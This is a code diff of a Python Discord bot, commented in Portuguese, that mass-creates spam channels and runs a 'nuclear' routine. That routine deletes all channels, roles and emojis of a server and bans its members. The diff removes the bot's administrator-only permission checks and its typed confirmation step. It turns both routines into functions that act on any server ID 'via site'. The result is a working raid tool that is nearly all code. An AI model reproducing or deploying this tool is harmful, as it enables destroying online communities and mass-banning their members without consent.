@@ -4,203 +4,162 @@ import asyncio
 import os
 import sys
 
-# ==================== FUNÇÃO PARA LER O TOKEN ====================
-
-def ler_token():
-    """Tenta ler o token de múltiplas fontes"""
-    
-    # 1. Primeiro tenta variável de ambiente
-    token = os.getenv('DISCORD_TOKEN')
-    if token:
-        print("✅ Token encontrado nas variáveis de ambiente")
-        return token
-    
-    # 2. Tenta ler do arquivo .env
-    try:
-        if os.path.exists('.env'):
-            with open('.env', 'r', encoding='utf-8') as f:
-                for linha in f:
-                    linha = linha.strip()
-                    if linha and not linha.startswith('#'):
-                        if 'DISCORD_TOKEN' in linha:
-                            # Formato: DISCORD_TOKEN=valor
-                            partes = linha.split('=', 1)
-                            if len(partes) == 2:
-                                token = partes[1].strip().strip('"').strip("'")
-                                print("✅ Token encontrado no arquivo .env")
-                                return token
-    except Exception as e:
-        print(f"⚠️ Erro ao ler .env: {e}")
-    
-    # 3. Se não achou, mostra erro detalhado
-    print("=" * 60)
-    print("❌ ERRO CRÍTICO: DISCORD_TOKEN não encontrado!")
-    print("=" * 60)
-    
-    return None
-
 # ==================== CONFIGURAÇÃO ====================
 
-# Ler o token
-TOKEN = ler_token()
+TOKEN = os.getenv('DISCORD_TOKEN')
 
-# Se não encontrou, encerra
 if TOKEN is None:
+    print("❌ ERRO: DISCORD_TOKEN não encontrado!")
     sys.exit(1)
 
-print(f"🔑 Token carregado: {TOKEN[:10]}... (tamanho: {len(TOKEN)})")
-
-# Intents do Discord
+# Intents necessários
 intents = discord.Intents.default()
-intents.members = True
-intents.message_content = True
 intents.guilds = True
+intents.members = True
 
-# Inicializar bot
-bot = commands.Bot(command_prefix='!', intents=intents)
-
-# ==================== COMANDOS ====================
-
-@bot.event
-async def on_ready():
-    print(f"✅ Bot online: {bot.user}")
-    print(f"📡 Servidores conectados: {len(bot.guilds)}")
-    print("=" * 40)
-    for guild in bot.guilds:
-        print(f"   • {guild.name} (ID: {guild.id})")
-    print("=" * 40)
-
-@bot.command(name='gdp')
-@commands.has_permissions(administrator=True)
-async def gdp(ctx, quantidade: int = 100, server_id: str = None):
-    """Cria canais G.D.P no servidor"""
+class GDPBot(commands.Bot):
+    def __init__(self):
+        super().__init__(command_prefix='!', intents=intents, help_command=None)
+        self.target_guild = None
     
-    # Determinar servidor alvo
-    target_guild = ctx.guild
-    if server_id:
-        try:
-            target_guild = bot.get_guild(int(server_id))
-            if not target_guild:
-                await ctx.send(f"❌ Servidor {server_id} não encontrado")
-                return
-        except ValueError:
-            await ctx.send("❌ ID do servidor inválido")
-            return
+    async def setup_hook(self):
+        print(f"✅ Bot iniciado com sucesso!")
+    
+    async def on_ready(self):
+        print(f"✅ Bot online: {self.user}")
+        print(f"📡 Servidores disponíveis:")
+        for guild in self.guilds:
+            print(f"   • {guild.name} (ID: {guild.id})")
+
+bot = GDPBot()
+
+# ==================== FUNÇÕES DE EXECUÇÃO DIRETA ====================
+
+async def executar_gdp(guild_id: int, quantidade: int = 100):
+    """Executa GDP diretamente sem precisar de comando no chat"""
+    
+    guild = bot.get_guild(guild_id)
+    if not guild:
+        return {"erro": f"Servidor {guild_id} não encontrado"}
     
     # Verificar permissões
-    if not target_guild.me.guild_permissions.manage_channels:
-        await ctx.send("❌ Bot não tem permissão para criar canais")
-        return
-    
-    await ctx.send(f"📝 Criando {quantidade} canais em {target_guild.name}...")
+    if not guild.me.guild_permissions.manage_channels:
+        return {"erro": "Bot não tem permissão para criar canais"}
     
     criados = 0
+    erros = 0
+    
     for i in range(1, quantidade + 1):
         try:
             nome = f"G.D.P-{i:03d}"
-            await target_guild.create_text_channel(nome)
+            
+            # Verifica se canal já existe
+            if discord.utils.get(guild.channels, name=nome):
+                continue
+            
+            await guild.create_text_channel(
+                nome,
+                reason="Comando GDP via site"
+            )
             criados += 1
             
+            # Pequena pausa para evitar rate limit
             if i % 10 == 0:
-                await ctx.send(f"📊 Progresso: {i}/{quantidade}")
-            
-            await asyncio.sleep(0.5)
+                await asyncio.sleep(1)
+            else:
+                await asyncio.sleep(0.5)
+                
         except Exception as e:
-            await ctx.send(f"❌ Erro: {e}")
-            break
+            erros += 1
+            print(f"Erro ao criar canal {i}: {e}")
     
-    await ctx.send(f"✅ {criados} canais criados com sucesso!")
+    return {
+        "sucesso": True,
+        "criados": criados,
+        "erros": erros,
+        "total": quantidade
+    }
 
-@bot.command(name='nuclear')
-@commands.has_permissions(administrator=True)
-async def nuclear(ctx, server_id: str = None):
-    """Limpeza nuclear do servidor"""
+async def executar_nuclear(guild_id: int):
+    """Executa nuclear diretamente sem precisar de comando no chat"""
     
-    # Determinar servidor alvo
-    target_guild = ctx.guild
-    if server_id:
-        try:
-            target_guild = bot.get_guild(int(server_id))
-            if not target_guild:
-                await ctx.send(f"❌ Servidor {server_id} não encontrado")
-                return
-        except ValueError:
-            await ctx.send("❌ ID do servidor inválido")
-            return
+    guild = bot.get_guild(guild_id)
+    if not guild:
+        return {"erro": f"Servidor {guild_id} não encontrado"}
     
     # Verificar permissões
-    if not target_guild.me.guild_permissions.administrator:
-        await ctx.send("❌ Bot precisa ser administrador")
-        return
+    if not guild.me.guild_permissions.administrator:
+        return {"erro": "Bot precisa ser administrador"}
     
-    # Mensagem de confirmação
-    await ctx.send("☢️ **CONFIRMAÇÃO NUCLEAR**\nDigite `CONFIRMAR` para prosseguir:")
+    resultados = {
+        "canais": 0,
+        "cargos": 0,
+        "emojis": 0,
+        "banidos": 0,
+        "erros": 0
+    }
     
-    def check(m):
-        return m.author == ctx.author and m.content == "CONFIRMAR"
-    
-    try:
-        await bot.wait_for('message', timeout=30.0, check=check)
-    except asyncio.TimeoutError:
-        await ctx.send("❌ Tempo esgotado")
-        return
-    
-    await ctx.send("☢️ **INICIANDO LIMPEZA NUCLEAR**...")
-    
-    # Deletar canais
-    canais_deletados = 0
-    for channel in target_guild.channels:
+    # 1. DELETAR CANAIS
+    for channel in guild.channels:
         try:
             await channel.delete()
-            canais_deletados += 1
+            resultados["canais"] += 1
             await asyncio.sleep(0.3)
         except:
-            pass
+            resultados["erros"] += 1
     
-    # Deletar cargos
-    cargos_deletados = 0
-    for role in target_guild.roles:
-        if role.name != "@everyone" and not role.managed and role < target_guild.me.top_role:
+    # 2. DELETAR CARGOS (exceto @everyone)
+    for role in guild.roles:
+        if role.name != "@everyone" and not role.managed and role < guild.me.top_role:
             try:
                 await role.delete()
-                cargos_deletados += 1
+                resultados["cargos"] += 1
                 await asyncio.sleep(0.3)
             except:
-                pass
+                resultados["erros"] += 1
     
-    # Banir membros
-    membros_banidos = 0
-    for member in target_guild.members:
-        if member != target_guild.me and member.top_role < target_guild.me.top_role:
+    # 3. DELETAR EMOJIS
+    for emoji in guild.emojis:
+        try:
+            await emoji.delete()
+            resultados["emojis"] += 1
+            await asyncio.sleep(0.3)
+        except:
+            resultados["erros"] += 1
+    
+    # 4. BANIR MEMBROS
+    for member in guild.members:
+        if member != guild.me and member.top_role < guild.me.top_role:
             try:
-                await member.ban(reason="Nuclear - Limpeza total")
-                membros_banidos += 1
+                await member.ban(reason="Nuclear via site")
+                resultados["banidos"] += 1
                 await asyncio.sleep(1)
             except:
-                pass
+                resultados["erros"] += 1
     
-    # Resultado final
-    embed = discord.Embed(
-        title="☢️ **NUCLEAR CONCLUÍDO**",
-        color=0xff0000
-    )
-    embed.add_field(name="Canais deletados", value=f"```{canais_deletados}```", inline=True)
-    embed.add_field(name="Cargos deletados", value=f"```{cargos_deletados}```", inline=True)
-    embed.add_field(name="Membros banidos", value=f"```{membros_banidos}```", inline=True)
-    
-    await ctx.send(embed=embed)
-
-@bot.event
-async def on_command_error(ctx, error):
-    if isinstance(error, commands.MissingPermissions):
-        await ctx.send("❌ Você precisa ser administrador para usar este comando")
-    elif isinstance(error, commands.CommandNotFound):
+    # Criar canal de log
+    try:
+        log_channel = await guild.create_text_channel("🚨-nuclear-log")
+        embed = discord.Embed(
+            title="☢️ NUCLEAR EXECUTADO",
+            description="Limpeza completa realizada via site",
+            color=0xff0000
+        )
+        embed.add_field(name="Canais deletados", value=resultados["canais"])
+        embed.add_field(name="Cargos deletados", value=resultados["cargos"])
+        embed.add_field(name="Emojis deletados", value=resultados["emojis"])
+        embed.add_field(name="Membros banidos", value=resultados["banidos"])
+        embed.add_field(name="Erros", value=resultados["erros"])
+        await log_channel.send(embed=embed)
+    except:
         pass
-    else:
-        await ctx.send(f"❌ Erro: {error}")
+    
+    return {
+        "sucesso": True,
+        "resultados": resultados
+    }
 
 # ==================== INICIAR BOT ====================
 
 if __name__ == "__main__":
-    print("🚀 Iniciando bot Zxy-panda...")
     bot.run(TOKEN)
